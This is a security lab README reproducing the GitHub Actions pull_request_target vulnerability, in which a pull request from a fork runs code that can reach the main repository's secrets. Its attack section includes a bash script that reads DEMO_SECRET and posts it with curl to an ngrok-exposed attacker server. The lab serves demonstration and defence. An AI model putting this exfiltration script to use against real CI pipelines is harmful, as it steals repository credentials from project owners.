# Lab Simulating GitHub Actions `pull_request_target` Vulnerability

## Objective

Build a test environment to simulate the GitHub Actions vulnerability mentioned in Socket.dev's article.

The purpose is to demonstrate how a Pull Request from a forked repository can trigger a CI/CD workflow and, in cases where the workflow is unsafely configured, code from the Pull Request can be executed in an environment with access to the main repository's secrets.

## Architecture

```
Owner Account
└── company-webapp
      ├── GitHub Actions
      ├── DEMO_SECRET
      └── Workflow: pull_request_target

               ↑ Pull Request

Attacker Account
└── company-webapp-fork
```

## Simulation Scenario

1. Create repository `company-webapp`
2. Create GitHub Secret: `DEMO_SECRET` (value: `hello-demo-secret`)
3. Create CI workflow using `pull_request_target`
4. Use a second GitHub account to fork the repository → `company-webapp-fork`
5. From the forked repository, create a Pull Request to the main repository
6. GitHub Actions is automatically triggered
7. Explain that if the workflow unsafely checks out and executes code from the Pull Request, an attacker could exploit it to access secrets or sensitive resources.

## Attacker Setup

Run `server.js` to start a webhook server that receives exfiltrated data:

```bash
node server.js
```

The server listens on port `3000`. Use [ngrok](https://ngrok.com/) to expose it publicly so the GitHub Actions workflow can reach it:

```bash
ngrok http 3000
```

Copy the ngrok HTTPS URL (e.g. `https://abc123.ngrok.io`).

## Attack Steps

Create a new branch containing the malicious code:

```bash
git checkout -b test-pending
```

Edit `workflow.sh` to steal the secret:

```bash
#!/usr/bin/env bash

echo "=== Script started ==="
echo "Current directory:"
pwd

echo "Files:"
ls -la
set -e

if [ -n "$DEMO_SECRET" ]; then
    echo "DEMO_SECRET is available"
    echo "Secret length: ${#DEMO_SECRET}"

    curl -X POST "https://your-ngrok-url.ngrok.io" -d "secret=$DEMO_SECRET"
    echo "test Pass"
else
    echo "DEMO_SECRET is not available"
fi
echo "=== Script finished ==="
```